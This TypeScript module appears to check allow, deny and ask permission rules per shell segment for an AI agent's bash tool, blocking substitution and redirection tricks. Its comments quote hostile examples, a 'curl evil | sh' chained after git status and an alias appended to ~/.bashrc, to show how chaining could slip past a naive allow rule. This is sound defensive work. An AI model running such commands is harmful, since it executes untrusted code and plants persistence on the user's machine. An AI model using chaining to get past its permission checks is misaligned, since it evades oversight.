import { type LexCache, lexCached } from "./lex-cache";
import { compiledRules, matchCompiledRule, requestTarget } from "./rules";
import { FILE_REDIRECT_OPS, renderSegment, splitShellSegments } from "./shell";
import type { PermissionRequest } from "./types";

export type { AllowRule } from "./rules";
export { matchAllowRule, parseAllowRule } from "./rules";

// Splits a bash command into its chained segments ("a && b | c; d" →
// ["a", "b", "c", "d"]) using the shell lexer, so separators inside quotes
// don't split and backgrounded commands ("a & b") split like any other chain.
// Returns null — no segment can be trusted — when the command embeds a
// command substitution ("$(...)" or backticks, which hide an arbitrary
// command in a benign one) or any segment writes/reads a file through an
// unquoted redirection (">", ">>", "<") or process substitution (">(...)",
// "<(...)"): `echo 'alias x=...' >> ~/.bashrc` must not sail through on
// bash(echo *). Fd duplication (2>&1) stays allow-eligible.
function splitCommandChain(command: string, lex?: LexCache): string[] | null {
  if (command.includes("$(") || command.includes("`")) return null;
  const tokens = lexCached(lex, command);
  if (tokens.some((token) => token.kind === "subst")) return null;
  const segments = splitShellSegments(tokens);
  for (const segment of segments) {
    if (segment.some((token) => token.kind === "op" && FILE_REDIRECT_OPS.has(token.op))) {
      return null;
    }
  }
  return segments.map(renderSegment).filter((segment) => segment.length > 0);
}

function withCommand(req: PermissionRequest, command: string): PermissionRequest {
  return {
    ...req,
    args: { ...((req.args ?? {}) as Record<string, unknown>), command },
  };
}

// Allow rules apply per chain segment: "bash(git *)" must not wave through
// "git status && curl evil | sh". Every segment has to match some rule, and a
// command with a substitution or a file redirection is never auto-allowed.
export function isAllowedByRules(
  rules: readonly string[],
  req: PermissionRequest,
  lex?: LexCache,
): boolean {
  if (req.toolName !== "bash") return matchesAnyRule(rules, req);
  const command = requestTarget(req);
  if (command === undefined) return matchesAnyRule(rules, req);
  const segments = splitCommandChain(command, lex);
  if (segments === null) return false;
  if (segments.length === 0) return matchesAnyRule(rules, req);
  return segments.every((segment) => matchesAnyRule(rules, withCommand(req, segment)));
}

// Deny rules stay maximally suspicious: any single matching segment denies,
// and a command that cannot be segmented falls back to whole-command matching.
export function isDeniedByRules(
  rules: readonly string[],
  req: PermissionRequest,
  lex?: LexCache,
): boolean {
  if (req.toolName !== "bash") return matchesAnyRule(rules, req);
  const command = requestTarget(req);
  if (command === undefined) return matchesAnyRule(rules, req);
  const segments = splitCommandChain(command, lex);
  if (segments === null || segments.length === 0) return matchesAnyRule(rules, req);
  return segments.some((segment) => matchesAnyRule(rules, withCommand(req, segment)));
}

// Ask rules force a confirmation prompt (auto mode's "still ask me about
// git push"). They use the same per-segment bash analysis as allow/deny
// rules, but — like deny — a single matching segment is enough: "git push &&
// git status" must still prompt about the push. A command that cannot be
// segmented falls back to whole-command matching.
export function isAskedByRules(
  rules: readonly string[],
  req: PermissionRequest,
  lex?: LexCache,
): boolean {
  if (req.toolName !== "bash") return matchesAnyRule(rules, req);
  const command = requestTarget(req);
  if (command === undefined) return matchesAnyRule(rules, req);
  const segments = splitCommandChain(command, lex);
  if (segments === null || segments.length === 0) return matchesAnyRule(rules, req);
  return segments.some((segment) => matchesAnyRule(rules, withCommand(req, segment)));
}

function matchesAnyRule(rules: readonly string[], req: PermissionRequest): boolean {
  return compiledRules(rules).some((rule) => rule !== null && matchCompiledRule(rule, req));
}

export function buildAllowRule(req: PermissionRequest): string {
  const target = requestTarget(req);
  return target !== undefined ? `${req.toolName}(${target})` : req.toolName;
}
